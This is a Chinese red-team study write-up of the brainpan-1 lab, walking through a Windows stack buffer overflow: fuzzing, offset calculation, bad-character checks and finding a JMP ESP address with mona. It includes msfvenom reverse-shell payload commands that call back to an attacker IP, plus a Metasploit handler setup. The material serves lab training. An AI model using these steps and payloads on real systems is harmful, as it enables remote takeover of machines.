## 简介

 **渗透测试-红队篇**

该篇章目的是重新牢固地基，加强每日训练操作的笔记，在记录地基笔记中会有很多跳跃性思维的操作和方式方法，望大家能共同加油学到东西。

 **注意** ：

> 本文仅用于技术讨论与研究，对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用Kali
> Linux作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，本站及作者概不负责。

## 一、前言

缓冲区溢出（buffer
overflow），是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。

项目十七：brainpan-1，专门考验缓冲区溢出知识，该项目仅仅开放了10000端口作为web端，经过简单的目录爆破就能发现存在brainpan.exe文件，该项目是乌班图环境并且安装了win的模块运行着exe文件，该文件启动了9999端口支撑服务，该环境就和AWD中的PWN题目一样，直播教学会有多种方法详细解释如何理解缓冲区溢出，如何发现缓冲区溢出，遇到缓冲区溢出如何利用，栈是什么等等问题详解。

接下来我讲分享其中方法一给到各位小伙伴学习，欢迎大佬们指点。

参考脚本信息：

    
    
    https://github.com/jessekurrus/brainpan
    

测试是否存在缓冲区溢出：

    
    
    python brainfuzzer.py 192.168.4.96 9999
    

![1645760490_62184fea1a9ba992d7f6e.png!small?1645760499553](https://image.3001.net/images/20220225/1645760490_62184fea1a9ba992d7f6e.png!small?1645760499553)通过对程序发送1~1500位不等字符进行验证，提示程序崩溃，存在缓冲区溢出！

## 二、windows缓冲区溢出

### 1、windows 10打开Immunity Debugger

Immunity Debugger-漏洞分析专用调试器，没有的百度到处是下载地址！

Immunity Debugger 安装参考：

    
    
    https://blog.csdn.net/clark3256453/article/details/121422527
    

开始利用操作：  
然后点击：File-C:/....程序  
![1645760497_62184ff1670be74629752.png!small?1645760499553](https://image.3001.net/images/20220225/1645760497_62184ff1670be74629752.png!small?1645760499553)

运行出数据后的界面：  
![1645760501_62184ff5b3184a45dcb96.png!small?1645760510527](https://image.3001.net/images/20220225/1645760501_62184ff5b3184a45dcb96.png!small?1645760510527)该界面是最初始的程序开启界面，需要点击右箭头图标才可运行程序：

![1645760506_62184ffa487735388445f.png!small?1645760511166](https://image.3001.net/images/20220225/1645760506_62184ffa487735388445f.png!small?1645760511166)![1645760510_62184ffe41e67e6a1e4f6.png!small?1645760511167](https://image.3001.net/images/20220225/1645760510_62184ffe41e67e6a1e4f6.png!small?1645760511167)开启完程序后，EAX值会清零，这时候本地程序会正常运行，并开启9999端口！

### 2、查询偏移量

1）利用pattern_create.rb生成1000位随机数值  
![1645760515_621850039a23e560299a4.png!small?1645760520824](https://image.3001.net/images/20220225/1645760515_621850039a23e560299a4.png!small?1645760520824)

    
    
    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
    

2）修改脚本brainpan1

![1645760524_6218500c7c43400067f13.png!small?1645760530564](https://image.3001.net/images/20220225/1645760524_6218500c7c43400067f13.png!small?1645760530564)

3）发送1000位随机去覆盖程序  
![1645760528_62185010b5ca189c09045.png!small?1645760530564](https://image.3001.net/images/20220225/1645760528_62185010b5ca189c09045.png!small?1645760530564)

    
    
    python brainpan1.py 10.211.55.44 9999
    

在kali执行对44的windows9999服务进行冲击。

![1645760533_62185015304932e70bcb5.png!small?1645760539735](https://image.3001.net/images/20220225/1645760533_62185015304932e70bcb5.png!small?1645760539735)可看到ESP已经被覆盖，得出EIP的值：35724134

4）EIP查看偏移量  
![1645760537_62185019e309116247533.png!small?1645760539736](https://image.3001.net/images/20220225/1645760537_62185019e309116247533.png!small?1645760539736)

    
    
    /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134
    [*] Exact match at offset 524
    

偏移量524！

5）解析下如何得到的

首先要知道内存地址和平常书写地址是相反的，内存会把内存低地址放在高位，内存高地址放在低位，所以排列顺序是：

    
    
    35724134
    34 41 72 35
    

对比ASCII表：  
![1645760544_621850206ee117c82bd44.png!small?1645760550267](https://image.3001.net/images/20220225/1645760544_621850206ee117c82bd44.png!small?1645760550267)

    
    
    34 41 72 35
    4  A  r  5
    4Ar5
    

对照ASCII表信息是：4Ar#  
![1645760551_62185027031785724efff.png!small?1645760559748](https://image.3001.net/images/20220225/1645760551_62185027031785724efff.png!small?1645760559748)所以对照的就是pattern_create.rb生成的1000字符中524位的地方存在溢出，pattern_offset.rb会自动计算在1000个字符中4Ar5位置在哪儿！

### 3、查看shellcode空间大小

思路：  
将EIP修改为shellcode代码的内存地址，将shellcode写入到该地址空间，程序读取EIP寄存器数值，将跳转到shellcode代码段并执行，接下来将寻找可存放shellcode的内存空间是多少！

![1645760556_6218502c1c3e3ccffc9c9.png!small?1645760560677](https://image.3001.net/images/20220225/1645760556_6218502c1c3e3ccffc9c9.png!small?1645760560677)这里将放入472个字节C去测试！

![1645760560_6218503002cb37f9a2564.png!small?1645760560677](https://image.3001.net/images/20220225/1645760560_6218503002cb37f9a2564.png!small?1645760560677)

    
    
    python brainpan2.py 10.211.55.44 9999
    

![1645760564_62185034152ad09842c17.png!small?1645760564885](https://image.3001.net/images/20220225/1645760564_62185034152ad09842c17.png!small?1645760564885)EBP栈底指针已经被524个A覆盖，EIP已经指出四个B，ESP已经覆盖了472个C字节。

在ESP位置右键选择：Follow in Dump  
![1645760568_621850383fd07dbf705b9.png!small?1645760568794](https://image.3001.net/images/20220225/1645760568_621850383fd07dbf705b9.png!small?1645760568794)

在左下视图右键选择：Hex-Hex/ASCII(16 bytes)  
![1645760573_6218503d03ffee3868234.png!small?1645760574674](https://image.3001.net/images/20220225/1645760573_6218503d03ffee3868234.png!small?1645760574674)选择十六个字节一行显示去观察！  
![1645760576_62185040a4b0b7c9e54dc.png!small?1645760578399](https://image.3001.net/images/20220225/1645760576_62185040a4b0b7c9e54dc.png!small?1645760578399)可看到起始位：005ff910，结束位：005FFAE0  
![1645760580_62185044b4ba8ef9a73a2.png!small?1645760581210](https://image.3001.net/images/20220225/1645760580_62185044b4ba8ef9a73a2.png!small?1645760581210)1D0是十六进制，转换十进制：  
![1645760585_62185049606d5739ff2b3.png!small?1645760585848](https://image.3001.net/images/20220225/1645760585_62185049606d5739ff2b3.png!small?1645760585848)最少的shellcode需要300字节，现在寄存器的大小是464，足以存放一个shellcode！

### 4、查找坏字符

不同类型的程序、协议、漏洞，会将某些字符认为是坏字符，这些字符有固定用途：

    
    
    1. 返回地址、shellcode、buffer中都不能出现坏字符
    2. null byte (0x00)空字符，用于终止字符串的拷贝操作
    3. return (0x0D)回车操作，表示POP3 PASS命令输入完成
    

思路：  
发送0x00--0xff 256个字符，查找所有坏字符  
例如：计算机都用ASCII编码不同的编码都表示不同的字符，一个字符一个字节  
00000000---11111111=256 有256种可能的字符情况

接下来查看坏字符，重新运行程序：brainpan2  
![1645760591_6218504f7b8c16ed1a725.png!small?1645760596717](https://image.3001.net/images/20220225/1645760591_6218504f7b8c16ed1a725.png!small?1645760596717)

![1645760595_62185053e7182119f1252.png!small?1645760596717](https://image.3001.net/images/20220225/1645760595_62185053e7182119f1252.png!small?1645760596717)

    
    
    python brainpan3.py 10.211.55.44 9999
    

![1645760600_6218505892fbd2b7ffb6f.png!small?1645760602674](https://image.3001.net/images/20220225/1645760600_6218505892fbd2b7ffb6f.png!small?1645760602674)

或者是查看：右键选择Follow in Dump  
![1645760604_6218505c93e5d5e723aad.png!small?1645760605140](https://image.3001.net/images/20220225/1645760604_6218505c93e5d5e723aad.png!small?1645760605140)  
![1645760608_62185060adab3592d5a77.png!small?1645760609178](https://image.3001.net/images/20220225/1645760608_62185060adab3592d5a77.png!small?1645760609178)![1645760613_621850656d00f2c50ce73.png!small?1645760616462](https://image.3001.net/images/20220225/1645760613_621850656d00f2c50ce73.png!small?1645760616462)可看到选择16字节显示后，最右边都是1~9~F说明没有坏字符！

![1645760618_6218506a186a282bb6590.png!small?1645760628015](https://image.3001.net/images/20220225/1645760618_6218506a186a282bb6590.png!small?1645760628015)对比发现除了00外，其余都很正常！  
接下来要找到跳转到ESP的指令指针寄存器的值！

### 5、漏洞利用开发

重定向数据流：

    
    
    1. 用ESP的地址替换EIP的值
    2. 但是ESP地址变化，硬编码不可行
    3. SLMail线程应用程序，操作系统为每个线程分配一段地址范围，每个线程地址范围不确定
    

变通思路：

    
    
    1. 在内存中寻找地址固定的系统模块
    2. 在模块中寻找JMP ESP指令的地址跳转，再由该指令间接跳转到ESP，从而执行shellcode
    3. mona.py脚本识别内存模块，搜索“return address”是JMP ESP指令的模块
    4. 寻找无DEP、ALSR保护的内存地址
    5. 内存地址不包含坏字符
    

![1645760624_6218507037963eff6327a.png!small?1645760630356](https://image.3001.net/images/20220225/1645760624_6218507037963eff6327a.png!small?1645760630356)

    
    
    !mona modules
    

SafeSEH、ASLR、NXCompat都是内存保护机制所保护的模块！  
要选择JMP ESP一定要选择这三项都未False的，正好有一项符合！

![1645760628_62185074482596a837c1b.png!small?1645760630356](https://image.3001.net/images/20220225/1645760628_62185074482596a837c1b.png!small?1645760630356)现在进入该模块去查找有没有jmp
esp的命令！  
brainpan.exe  
0BADF00D

查找JMP ESP：  
利用nasm_shell.rb查看jmp esp的地址！

    
    
    locate nasm_shell
    /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
    nasm > jmp esp
    00000000  FFE4              jmp esp
    

可看到jmp esp地址：\xff\xe4

首先我们需要找到EIP offset，也就是正好覆盖到EIP的偏移量以便我们精准的覆盖EIP寄存器。所以我们要知道哪4个
a是放入到了EIP寄存器中，这就很复杂了，当然方法是有的，这里我们使用Immunity Debugger的插件mona，这样我们就避免了平常复杂的寻找方法。

安装mona：  
![1645760633_6218507963e614ee4d610.png!small?1645760634177](https://image.3001.net/images/20220225/1645760633_6218507963e614ee4d610.png!small?1645760634177)将mona.py放在Immunity
Debugger安装目录PyCommands下就行了!

![1645760637_6218507d0f4a09988ff35.png!small?1645760637310](https://image.3001.net/images/20220225/1645760637_6218507d0f4a09988ff35.png!small?1645760637310)

    
    
    !mona find -s "\xff\xe4" -m brainpan.exe
    

![1645760642_62185082b27d598f31622.png!small?1645760649062](https://image.3001.net/images/20220225/1645760642_62185082b27d598f31622.png!small?1645760649062)![1645760646_621850865b92f379c02c7.png!small?1645760649063](https://image.3001.net/images/20220225/1645760646_621850865b92f379c02c7.png!small?1645760649063)获得JMP
ESP地址：0x311712f3

shellcode生成：  
![1645760651_6218508b79c3483abae70.png!small?1645760681933](https://image.3001.net/images/20220225/1645760651_6218508b79c3483abae70.png!small?1645760681933)

    
    
    msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=192.168.2.157 -e x86/shikata_ga_nai -b "\x00" -f py
    

生成shellcode后进行脚本编写！

brainpan4：  
  
将shellcode防止对端！

windows10开启brainpan.exe：  
![1645760661_6218509591f73eb7df988.png!small?1645760681929](https://image.3001.net/images/20220225/1645760661_6218509591f73eb7df988.png!small?1645760681929)

kali运行脚本：  
![1645760665_62185099df75df4c89f64.png!small?1645760681931](https://image.3001.net/images/20220225/1645760665_62185099df75df4c89f64.png!small?1645760681931)

成功缓冲区溢出，获得反弹shell：  
![1645760669_6218509deeeec07f150ba.png!small?1645760681933](https://image.3001.net/images/20220225/1645760669_6218509deeeec07f150ba.png!small?1645760681933)

这时候要反弹linux的shellcode：brainpan5  
  

    
    
    msfvenom -p linux/x86/shell_reverse_tcp LPORT=443 LHOST=192.168.2.157 -e x86/shikata_ga_nai -b "\x00" -f py
    

然后替换脚本shellcode：  
  
替换后进行执行：

    
    
    msfconsole
    use exploit/multi/handler
    set payload linux/x86/shell_reverse_tcp
    set lport 443
    set lhost 192.168.2.157
    exploit -j
    

  
MSF成功获得反弹shell！

## 三、总结

今天学到windows缓冲区溢出中windows 10使用Immunity
Debugger逆向分析工具，熟悉栈如何查找栈空间，如何查看坏字符，如何编写EXP利用等等操作，最后远程代码执行控制服务器等操作，学到了非常多的小技巧和干货，希望小伙伴能实际操作复现一遍！来巩固告知企业单位的漏洞情况，并尽快进行加固巩固安全！

希望大家提高安全意识，没有网络安全就没有国家安全！

今天基础牢固就到这里，虽然基础，但是必须牢记于心。

